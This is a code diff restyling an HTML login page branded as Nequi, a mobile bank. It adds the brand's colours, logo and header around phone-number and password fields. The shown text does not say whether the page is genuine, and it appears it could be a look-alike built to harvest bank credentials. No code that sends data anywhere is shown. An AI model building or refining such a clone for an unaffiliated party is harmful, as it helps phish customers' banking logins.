@@ -6,23 +6,82 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
     body {
-      background: #fff;
+      background: #fae9f5;
+      margin: 0;
       font-family: 'Inter', Arial, sans-serif;
+      min-height: 100vh;
+      position: relative;
     }
+    /* Fondo decorativo con figuras */
+    body::before {
+      content: "";
+      position: fixed;
+      left: 0; top: 0; width: 100vw; height: 100vh;
+      z-index: 0;
+      background: 
+        linear-gradient(120deg, #fae9f5 90%, #fff 100%);
+    }
+    /* Header */
+    .nequi-header {
+      width: 100%;
+      background: #fff;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-sizing: border-box;
+      height: 70px;
+      position: relative;
+      z-index: 2;
+    }
+    .nequi-logo {
+      margin-left: 30px;
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: #210024;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+    .nequi-logo-dot {
+      color: #e4007a;
+      font-size: 2.5rem;
+      font-weight: bold;
+      margin-right: 3px;
+    }
+    .nequi-recarga-btn {
+      background: #e4007a;
+      color: #fff;
+      font-size: 1.07rem;
+      font-weight: 500;
+      border: none;
+      border-radius: 8px;
+      padding: 13px 32px;
+      margin-right: 28px;
+      cursor: pointer;
+      transition: background 0.17s;
+      box-shadow: 0 2px 8px rgba(228,0,122,0.18);
+    }
+    .nequi-recarga-btn:hover {
+      background: #b80063;
+    }
+    /* Contenedor del login centrado */
     .nequi-login-container {
-      max-width: 370px;
-      margin: 48px auto 0 auto;
+      max-width: 410px;
+      margin: 46px auto 0 auto;
       background: #fff;
       border-radius: 16px;
-      box-shadow: 0 2px 16px rgba(0,0,0,0.07);
-      padding: 34px 24px 34px 24px;
+      box-shadow: 0 2px 26px 0 rgba(190, 30, 120, 0.07);
+      padding: 36px 32px 34px 32px;
       display: flex;
       flex-direction: column;
       align-items: stretch;
+      position: relative;
+      z-index: 2;
     }
     .nequi-login-container h1 {
       text-align: center;
-      color: #2c1246;
+      color: #210024;
       font-weight: 700;
       margin-bottom: 8px;
       font-size: 2rem;
@@ -30,9 +89,10 @@
     .nequi-login-container p {
       text-align: center;
       color: #6a1c85;
-      font-size: 1.05rem;
-      margin-bottom: 28px;
+      font-size: 1.08rem;
+      margin-bottom: 24px;
       margin-top: 0;
+      font-weight: 500;
     }
     .nequi-field {
       margin-bottom: 18px;
@@ -62,7 +122,7 @@
       min-width: 120px;
     }
     .input-indicativo img {
-      width: 24px;
+      width: 26px;
       height: 18px;
       margin-right: 7px;
       border-radius: 3px;
@@ -83,7 +143,7 @@
       border-left: 0;
       height: 48px;
       padding: 0 18px;
-      font-size: 1.11rem;
+      font-size: 1.13rem;
       box-sizing: border-box;
       outline: none;
       transition: border-color 0.25s;
@@ -92,13 +152,11 @@
     .input-celular:focus {
       border-color: #db1fff;
     }
-    .nequi-field label {
-      display: none;
-    }
+    .nequi-field label { display: none; }
     .nequi-field input[type="password"] {
       width: 100%;
-      padding: 13px 18px;
-      font-size: 1.11rem;
+      padding: 15px 18px;
+      font-size: 1.13rem;
       border: 1.5px solid #f3eaf6;
       border-radius: 8px;
       background: #faf5fc;
@@ -119,7 +177,7 @@
       display: flex;
       flex-direction: column;
       align-items: flex-start;
-      margin-bottom: 24px;
+      margin-bottom: 28px;
       margin-top: 8px;
     }
     .nequi-btn {
@@ -130,7 +188,7 @@
       font-weight: 700;
       border: none;
       border-radius: 10px;
-      padding: 15px 0;
+      padding: 17px 0;
       margin-top: 8px;
       cursor: pointer;
       transition: background 0.2s;
@@ -140,9 +198,21 @@
     .nequi-btn:hover {
       background: #b80063;
     }
+    @media (max-width: 600px) {
+      .nequi-login-container { max-width: 97vw; padding: 20px 4vw; }
+      .nequi-header { height: 60px; }
+      .nequi-logo { font-size: 1.65rem; margin-left: 10px;}
+      .nequi-recarga-btn { padding: 11px 18px; margin-right: 10px;}
+    }
     </style>
 </head>
 <body>
+    <header class="nequi-header">
+        <div class="nequi-logo">
+            <span class="nequi-logo-dot">•</span>Nequi
+        </div>
+        <button class="nequi-recarga-btn">Recarga</button>
+    </header>
     <div class="nequi-login-container">
         <h1>Entra a tu Nequi</h1>
         <p>Podrás bloquear tu Nequi, consultar tus datos.</p>
